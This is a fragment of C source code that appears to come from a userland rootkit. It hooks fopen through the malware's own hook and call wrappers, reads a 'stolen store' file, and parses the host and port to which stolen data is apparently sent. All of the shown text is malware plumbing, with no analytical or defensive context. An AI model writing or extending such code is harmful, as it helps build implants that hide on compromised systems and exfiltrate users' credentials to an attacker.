
// STOLESTORE_PATH

char *readstorepath(void){
    preparestolenstore(readgid());

    FILE *fp;
    char buf[64], *ret;
    size_t storesize;

    hook(CFOPEN);

    fp = call(CFOPEN, STOLESTORE_PATH, "r");
    if(fp == NULL) return NULL;
    fgets(buf, sizeof(buf), fp);
    fclose(fp);
    buf[strlen(buf)-1]='\0';

    storesize = strlen(buf)+1;
    ret = malloc(storesize);
    if(!ret) return NULL;
    memset(ret, 0, storesize);
    strncpy(ret, buf, storesize);
    return ret;
}

char *gethost(void){
    char *store, *host;

    store = readstorepath();
    if(!store) return NULL;
    host = strdup(strtok(store, ":"));
    free(store);

    return host;
}

unsigned short getport(void){
    char *store, *host;
    unsigned short ret;

    store = readstorepath();
    if(!store) return 0;

    host = strtok(store, ":");
    memset(host, 0, strlen(host));
    ret = (unsigned short)atoi(strtok(NULL, ":"));
    free(store);

    return ret;
}